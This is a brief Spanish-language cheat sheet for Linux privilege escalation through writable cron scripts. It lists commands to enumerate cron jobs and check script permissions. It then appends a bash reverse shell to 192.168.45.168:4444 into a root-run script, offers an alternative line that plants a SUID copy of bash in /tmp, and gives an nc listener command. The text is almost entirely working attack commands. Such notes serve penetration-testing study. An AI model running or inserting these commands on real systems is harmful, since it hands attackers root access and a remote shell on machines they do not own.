```bash
# Buscar tareas cron
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
ls -la /var/spool/cron/crontabs/

# Ejemplo de /etc/crontab:
# * * * * * root /usr/local/bin/cleanup.sh

# Verificar permisos del script
ls -la /usr/local/bin/cleanup.sh

# Si es escribible, insertar reverse shell
echo 'bash -i >& /dev/tcp/192.168.45.168/4444 0>&1' >> /usr/local/bin/cleanup.sh

# Alternativa: copia de bash con SUID
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /usr/local/bin/cleanup.sh
# Después ejecutar: /tmp/rootbash -p
```

Escuchar en la maquina:

```bash
rlwrap nc -lvnp 4444
```

